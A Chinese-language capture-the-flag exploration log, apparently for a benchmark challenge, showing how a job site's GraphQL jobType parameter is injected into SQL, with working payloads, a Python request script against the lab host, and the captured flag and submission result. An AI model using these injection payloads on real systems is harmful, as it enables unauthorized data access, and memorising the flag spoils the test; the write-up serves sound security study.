# xben-038-24 · 探索记录

对应题解：[`xben-038-24.md`](./xben-038-24.md)

## 目标与起点

容器 `10.0.173.136:80`，`server: uvicorn`，标题 `Ultimate Job Aggregator`。

界面与 `xben-006-24` 完全相同（同样的下拉框、同样的 Bootstrap 4.5.2），
但 `/openapi.json` 不存在，`/jobs` 返回 `Not Found`——**接口换了**。

读首页内联脚本发现真正的入口：

```javascript
const query = `
    query {
        jobs(jobType: "${jobType}") { id name type description }
    }
`;
fetch('/graphql/', { method:'POST', headers:{'Content-Type':'application/json'},
                     body: JSON.stringify({ query }) });
```

即 `POST /graphql/`，且 **`${jobType}` 是直接插进查询字符串的**。

## 第一阶段：基线

```graphql
query { jobs(jobType: "") { id name type description } }
```

```json
{"data":{"jobs":[
 {"id":1,"name":"Senior Frontend Dev","type":"front-end","description":"reactjs"},
 {"id":2,"name":"Staff Backend Python","type":"back-end","description":"django"},
 {"id":4,"name":"Frontend Dev","type":"front-end","description":"angular"}]}}
```

**id 1、2、4 —— 缺 3。** 与 006 完全一样的信号。

```graphql
query { jobs(jobType: "private") { id } }
# {"data":null,"errors":[{"message":"Only admins can see private jobs"}]}
```

## 第二阶段：确认能逃出 GraphQL 字符串

GraphQL 里 `"` 需要转义成 `\"`，所以试了几种：

| jobType | 结果 |
| --- | --- |
| `private" ` （后缀引号） | `{"data":{"jobs":[]}}`，**不报 admin 错** |
| `private\` | `{"data":{"jobs":[]}}` |
| `private` | 报 `Only admins can see private jobs` |

**判据**：`private" ` 不再触发鉴权分支（不报 admin），说明鉴权是**字符串相等比较**，
而查询那一步用的不是同一个值。于是转向 SQL 注入。

## 第三阶段：SQL 注入

| jobType | 结果 |
| --- | --- |
| `private'--` | 返回 id=3，`description = flag{2d6dab2a-f744-48a1-8351-d43cebfbf5c5}` |
| `private' OR '1'='1` | 返回 1、2、3、4 全部 |
| `x' OR 1=1--` | 同上 |

`private'--` 精确命中目标（只有 id=3）。

```json
{"data":{"jobs":[{"id":3,"name":"Hidden job","type":"private",
  "description":"flag{2d6dab2a-f744-48a1-8351-d43cebfbf5c5}"}]}}
```

## 第四阶段：拿 flag

用 Python 构造请求，避免手工转义多层引号：

```python
import json, urllib.request
payload = {"query": 'query { jobs(jobType: "private\'--") { id name type description } }'}
req = urllib.request.Request("http://10.0.173.136/graphql/",
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"})
print(urllib.request.urlopen(req).read().decode())
```

提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 用 `-d '{"query":"…"}'` 直接拼 shell 字符串 | `Unable to parse request body as JSON` | 多层引号被 shell 吃掉，改用 Python 构造 JSON |
| 打 `/jobs`（006 的路径） | `Not Found` | 本题只有 `/graphql/` |
| 打 `/openapi.json` | 404 | 不是 FastAPI 的 OpenAPI 端点 |
| `jobType: "private"` | admin 错误 | 鉴权分支按字符串相等判断 |
| `jobType: "private\" "` | 返回空列表 | 逃出了字符串比较，但没绕过 SQL 条件 |
| `jobType: "private'--"` | **返回 id=3 + flag** | check-vs-use：鉴权看字符串、查询看 SQL |

## 这次真正的收获

1. **界面相同不代表接口相同。** 026（REST `/jobs`）和 038（GraphQL `/graphql/`）
   长得一模一样，但路径和行为都不同。**先读页面里的 `fetch`**，不要照搬上一题。
2. **GraphQL 的字符串参数也能注入 SQL。** GraphQL 层的转义只管语法；
   一旦后端把值拼进 SQL，`'` 和 `--` 就原样生效。判据是"不报鉴权错但行为变了"。
3. **`private" ` 那一步是关键分水岭。** 它不报 admin 错 → 说明鉴权是字符串比较；
   但它返回空 → 说明查询另有逻辑。两者不一致，就是 check-vs-use。
4. **Shell 里拼 JSON 容易出错。** 这次第一次尝试直接 `curl -d '{...}'` 就被引号搞成了
   `Unable to parse request body as JSON`；用 Python `json.dumps` 一次就对了。
